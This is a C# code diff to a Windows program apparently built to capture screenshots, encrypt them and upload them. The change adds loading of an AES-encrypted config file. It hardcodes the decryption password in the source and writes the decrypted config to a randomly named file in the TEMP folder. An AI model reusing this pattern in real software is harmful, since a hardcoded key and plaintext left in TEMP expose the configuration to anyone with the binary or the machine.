@@ -4,6 +4,7 @@ using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
+using System.Linq;
 using System.Text.RegularExpressions;
 using System.Threading;
 using System.Windows.Forms;
@@ -13,6 +14,7 @@ namespace NyarukoEye_Windows
     class Program
     {
         static private int debuglevel = 4;
+        static private string filePwd = "UYH7awo9p2xZL5yBWOtDS04AUfFgDQJl";
         static private string tempdir = "";
         static private string imgType = "";
         static private string encType = "";
@@ -34,16 +36,16 @@ namespace NyarukoEye_Windows
         static private bool screenshotThreadWorking = false;
         static private bool encryptThreadWorking = false;
         static private bool netuploadThreadWorking = false;
-        /// <summary>
-        /// 应用程序的主入口点。
-        /// </summary>
+        static private string tempini = "";
+
         [STAThread]
         static int Main(string[] args)
         {
             //Application.EnableVisualStyles();
             //Application.SetCompatibleTextRenderingDefault(false);
             AppDomain appd = AppDomain.CurrentDomain;
-            Process[] processes = System.Diagnostics.Process.GetProcessesByName(Application.CompanyName);
+            Process[] processes = Process.GetProcessesByName(Application.CompanyName);
+            Enc.debug = debuglevel == 4;
             if (processes.Length > 1)
             {
                 printf("已经有一个实例正在运行。");
@@ -64,8 +66,48 @@ namespace NyarukoEye_Windows
             };
             string fileDir = Environment.CurrentDirectory;
             printf("当前程序目录：" + fileDir);
-            string[] IniFileDirArr = Directory.GetFiles(fileDir, "*.ini");
+            string temp = Environment.GetEnvironmentVariable("TEMP");
+            DirectoryInfo info = new DirectoryInfo(temp);
+            string sysTempDir = info.FullName;
+            string[] IniFileDirArr = Directory.GetFiles(fileDir, "*.ine");
+            string confFile = "";
             if (IniFileDirArr.Length == 0)
+            {
+                // 沒有找到加密配置檔案，找明文配置檔案
+                IniFileDirArr = Directory.GetFiles(fileDir, "*.ini");
+                if (IniFileDirArr.Length == 0)
+                {
+                    // 還是沒有找到
+                    printf("找不到配置文件！", 3);
+                    return -1;
+                }
+                else
+                {
+                    confFile = IniFileDirArr[0];
+                }
+            }
+            else
+            {
+                // 找到加密的配置檔案，解密後加載
+                try
+                {
+                    string txt = File.ReadAllText(IniFileDirArr[0]);
+                    txt = StringAES.Decrypt(txt, filePwd);
+                    tempini = sysTempDir + "\\" + randomString(64);
+                    File.WriteAllText(tempini, txt);
+                    confFile = IniFileDirArr[0];
+                    IniFileDirArr[0] = tempini;
+                }
+                catch (Exception err)
+                {
+                    printf("找不到配置文件！", 3);
+                    return -1;
+                }
+            }
+            string IniFileDir = IniFileDirArr[0];
+            printf("加载配置文件：" + confFile);
+            INI ini = new INI(IniFileDir);
+            if (!ini.ExistINIFile())
             {
                 printf("找不到配置文件！", 3);
                 return -1;
@@ -80,15 +122,6 @@ namespace NyarukoEye_Windows
                 Enc.opensslPath = opensslPaths[0];
                 printf("OpenSSL：" + opensslPaths[0]);
             }
-            Enc.debug = debuglevel == 4;
-            string IniFileDir = IniFileDirArr[0];
-            printf("加载配置文件：" + IniFileDir);
-            INI ini = new INI(IniFileDir);
-            if (!ini.ExistINIFile())
-            {
-                printf("找不到配置文件！", 3);
-                return -1;
-            }
             int screenW = Screen.PrimaryScreen.Bounds.Width;
             int screenH = Screen.PrimaryScreen.Bounds.Height;
             printf("主屏幕像素：" + screenW.ToString() + " × " + screenH.ToString());
@@ -101,9 +134,7 @@ namespace NyarukoEye_Windows
             tempdir = ini.IniReadValue("Work", "TempDir");
             if (tempdir.Length == 0)
             {
-                string temp = Environment.GetEnvironmentVariable("TEMP");
-                DirectoryInfo info = new DirectoryInfo(temp);
-                tempdir = info.FullName + "\\" + prefix;
+                tempdir = sysTempDir + "\\" + prefix;
             }
             prefix += "_";
             if (!Directory.Exists(tempdir)) Directory.CreateDirectory(tempdir);
@@ -363,6 +394,13 @@ namespace NyarukoEye_Windows
             string[] leveltext = new string[4] { "D", "I", "W", "E" };
             string printtext = "[" + DateTime.Now.ToString() + "][" + leveltext[level] + "] " + txt;
             Console.WriteLine(printtext);
+        }
+        public static string randomString(int length)
+        {
+            const string chars = "qwertyuiopasdfghjklzxcvbnm0123456789";
+            Random random = new Random();
+            return new string(Enumerable.Repeat(chars, length)
+              .Select(s => s[random.Next(s.Length)]).ToArray());
         }
         ~Program()
         {
